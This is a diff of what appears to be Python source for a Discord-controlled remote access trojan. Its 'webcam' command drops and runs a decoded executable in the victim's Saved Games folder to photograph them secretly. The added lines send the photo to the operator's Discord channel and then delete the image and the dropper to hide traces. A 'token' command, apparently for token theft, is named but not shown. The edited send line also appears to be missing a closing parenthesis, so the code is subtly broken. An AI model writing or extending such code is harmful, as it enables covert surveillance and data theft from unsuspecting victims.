@@ -100,9 +100,9 @@ async def webcam(ctx):
     os.chdir(f"C:\\Users\\{os.getenv('username')}\\Saved Games")
     with open("cc.exe", "wb") as fh: fh.write(decodebytes(webcam))
     subprocess.run("cc.exe & ren image.bmp image.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    await ctx.send(embed=discord.Embed(title="Here is the photo", color=0x0081FA), file=discord.File(os.path.join(os.getenv("temp") + "\\image.png")))
-    os.remove(os.path.join(os.getenv("temp") + "\\image.png"))
-    os.remove(os.path.join(os.getenv("temp") + "\\cc.exe")); os.chdir(ogdir)
+    await ctx.send(embed=discord.Embed(title="Here is the photo", color=0x0081FA), file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\image.png")
+    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\image.png")
+    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\cc.exe"); os.chdir(ogdir)
 
 @client.command()
 async def token(ctx):
